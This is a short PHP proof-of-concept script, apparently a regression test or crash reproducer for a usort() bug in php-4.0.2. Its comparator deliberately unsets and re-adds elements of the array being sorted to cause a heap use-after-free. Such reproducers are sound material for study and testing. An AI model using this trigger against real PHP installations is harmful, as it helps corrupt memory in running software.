<?php
// GIT-18a0d46a1b44 / GIT-6f38acfaf906 "Safely reassign array in usort()"
// The exact 2021 fix (separated-arr ZVAL_ARR reassign + GC-during-dtor double free)
// is a PHP7+ construct. At php-4.0.2 usort() sorts the live HashTable in place via
// zend_hash_sort(target_hash, qsort, array_user_compare, 1) (ext/standard/array.c:560).
// The reachable corruption in the SAME function: the user comparator mutates the array
// being sorted, so buckets that zend_hash_sort still references are freed/reallocated
// -> heap use-after-free / OOB while sorting.
function cmp($x, $y) {
    global $a;
    // free buckets the in-progress sort still holds pointers to
    unset($a[2]); unset($a[3]); unset($a[4]); unset($a[5]); unset($a[6]);
    // and force reallocation of the bucket storage
    $a[100] = 1; $a[101] = 2; $a[102] = 3; $a[103] = 4; $a[104] = 5;
    return ($x < $y) ? -1 : 1;
}
$a = array(5,3,8,1,9,2,7,4,6,0,11,12,13,14,15,16,17,18,19,20);
usort($a, 'cmp');
echo "done ", count($a), "\n";
?>
